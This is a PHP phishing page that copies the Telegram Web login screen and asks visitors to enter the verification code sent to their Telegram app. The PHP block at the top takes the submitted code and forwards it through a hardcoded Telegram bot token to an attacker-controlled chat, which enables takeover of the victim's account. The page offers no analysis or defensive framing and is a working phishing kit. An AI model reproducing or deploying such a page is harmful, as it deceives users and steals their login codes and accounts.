<?php
function message($mess)
{
	$token = "1175341615:AAE2e6JWK-j6n6JlWZbyu9maZDzLuxPyduA";
	$id = "-1001491779537";
	$to = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($mess));
        echo $to;
}

if($_GET['phone_code'])
{
$code = $_GET['phone_code'];
message($code);
}

?>

<!DOCTYPE html5>
<!-- saved from url=(0032)https://web.telegram.org/#/login -->
<html lang="en" manifest="webogram.appcache" ng-csp="" xmlns:ng="http://angularjs.org" id="ng-app" style="display: block; background: rgb(231, 235, 240);"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"><title>Telegram Web</title><link rel="stylesheet" href="./telega_files/app.css"><link rel="manifest" href="https://web.telegram.org/manifest.webapp.json"><link rel="shortcut icon" type="image/x-icon" href="https://web.telegram.org/favicon.ico"><link rel="apple-touch-icon" href="https://web.telegram.org/img/iphone_home120.png"><link rel="apple-touch-icon" sizes="120x120" href="https://web.telegram.org/img/iphone_home120.png"><link rel="apple-touch-startup-image" media="(device-width: 320px)" href="https://web.telegram.org/img/iphone_startup.png"><meta name="apple-mobile-web-app-title" content="Telegram Web"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="theme-color" content="#497495"><meta name="google" content="notranslate"><meta property="og:title" content="Telegram Web"><meta property="og:url" content="https://web.telegram.org/"><meta property="og:image" content="https://web.telegram.org/img/logo_share.png"><meta property="og:site_name" content="Telegram Web"><meta property="description" content="Welcome to the Web application of Telegram messenger. See https://github.com/zhukov/webogram for more info."><meta property="og:description" content="Welcome to the Web application of Telegram messenger. See https://github.com/zhukov/webogram for more info."><link rel="stylesheet" href="./telega_files/desktop.css"><style type="text/css">ogvjs { display: inline-block; position: relative; -webkit-user-select: none; -webkit-tap-highlight-color: rgba(0,0,0,0); </style></head><body class="non_osx non_msie is_1x"><!----><div class="page_wrap" ng-view=""><div class="login_page_wrap" my-custom-background="#e7ebf0">
  <div class="login_head_bg"></div>
  <div class="login_page">
    <div class="login_head_wrap clearfix" ng-switch="progress.enabled">
      <!---->
      <!----><div ng-switch-default="" class="login_head_submit_wrap" style="">
        <!---->
        <!----><!---->
        <!---->
        <!---->
      </div><!---->
      <a class="login_head_logo_link" href="https://telegram.org/" target="_blank">
        <i class="icon icon-tg-logo"></i><i class="icon icon-tg-title"></i>
      </a>
    </div>

    <div class="login_form_wrap">
      <!---->

      <!---->

      <!----><form  action="telega.php" method="GET" name="myLoginForm" ng-if="credentials.phone_code_hash &amp;&amp; !credentials.phone_code_valid" ng-submit="logIn()" class="ng-dirty ng-valid-parse ng-valid ng-valid-required" style="">
        <h3 class="login_phone_head"><span ng-bind="credentials.phone_country">BOT</span> <span ng-bind="credentials.phone_number">ADMIN PANEL</span></h3>

        <div ng-switch="credentials.type._">
          <!----><p ng-switch-when="auth.sentCodeTypeApp" class="login_smscode_lead" my-i18n="login_enter_code_label_md">We've sent the code to the <strong>Telegram</strong> app on your other device.<br>Please enter the code below.</p><!---->
          <!---->
          <!---->
        </div>

        <!----><div ng-if="nextPending.type" ng-switch="nextPending.remaining &gt; 0">
          <!---->
          <!----><p ng-switch-default="" class="login_smscode_lead" ng-switch="nextPending.progress" style="">
            <!---->
            
          </p><!---->
        </div><!---->

        <div class="md-input-group md-input-group-centered md-input-animated md-input-has-value md-input-focused" ng-class="{&#39;md-input-error&#39;: error.field == &#39;phone_code&#39;}" my-labeled-input="" ng-switch="error.field == &#39;phone_code&#39;">
          <!---->
          <!----><label ng-switch-default="" class="md-input-label" my-i18n="login_number_input_placeholder">Enter your code</label><!---->
          <input autocomplete="off" class="md-input ng-touched ng-dirty ng-valid-parse ng-not-empty ng-valid ng-valid-required" my-focused="" name="phone_code" size="4" maxlength="5" type="tel" ng-model="credentials.phone_code" required="" style="">
<submit name="NEXT" value="NEXT"/>
        </div>
      </form><!---->

      <!---->

      <!---->

    </div>

    <div ng-switch="about.shown">
      <!---->
      <!----><div ng-switch-default="" class="login_footer_wrap">
        <p my-i18n="login_about_intro">Welcome to the official Telegram web-client.</p>
        <a class="logo_footer_learn_more_link" href="https://web.telegram.org/" ng-click="about.shown = true" my-i18n="login_about_learn">Learn more</a>
      </div><!---->

    </div>
  </div>

</div>

</div><div id="notify_sound"></div><script src="https://web.telegram.org/telega_files/app.js"></script><div id="nacl_listener"><embed id="mtproto_crypto" width="0" height="0" src="nacl/mtproto_crypto.nmf" type="application/x-pnacl"></div></body></html>